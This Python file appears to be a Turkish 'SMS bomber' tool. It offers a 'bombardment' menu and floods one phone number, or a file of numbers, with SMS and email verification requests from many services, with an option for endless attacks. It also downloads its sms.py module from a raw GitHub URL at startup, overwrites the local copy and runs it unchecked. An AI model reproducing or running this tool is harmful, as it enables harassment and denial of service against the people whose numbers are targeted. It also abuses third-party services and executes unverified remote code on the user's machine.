from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from requests import get
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

r = get("https://raw.githubusercontent.com/35-KM/Sms35./main/sms.py").text

with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()

if read == r:
    pass
else:
    print(Fore.RED + "Güncelleme yapılıyor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)


from sms import SendSms
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)
            
while 1:
    system("cls||clear")
    print("""{}
 _____   ____            _  ____  __ 
|___ /  | ___|          | |/ /  \/  |
  |_ \  |___ \   _____  | ' /| |\/| |
 ___) |  ___) | |_____| | . \| |  | |
|____/  |____/          |_|\_\_|  |_|\
                                                                                           
                  {}Coded by {} 35-KM\n  
    """.format(Fore.LIGHTGREEN_EX, Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTRED_EX + "  1- Bombardıman\n  2- Çıkış\n\n" + Fore.LIGHTGREEN_EX + " Seçimini yap => "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue

    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTGREEN_EX + "Tel no başında +90 olmadan yaz. (Sonsuz saldırı için ENTER a bas.)=>>> "+ Fore.LIGHTRED_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTGREEN_EX + "Tel no ların kayıtlı olduğu dizini yaz. =>>> "+ Fore.LIGHTRED_EX, end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz saldırı için ENTER a bas.)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı tel no. Tekrar dene.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTGREEN_EX + "Mail adresi (Mail yoksa burayı ENTER la geçebilirsin.) =>>> "+ Fore.LIGHTRED_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTGREEN_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTRED_EX, end="")
            kere = input()
            if kere: # 
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTGREEN_EX + "Kaç saniye aralıkla yollansın. =>>> "+ Fore.LIGHTRED_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail) # Coded By 35-KM
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTGREEN_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTGREEN_EX + "Çıkış yapılıyor...")
        break
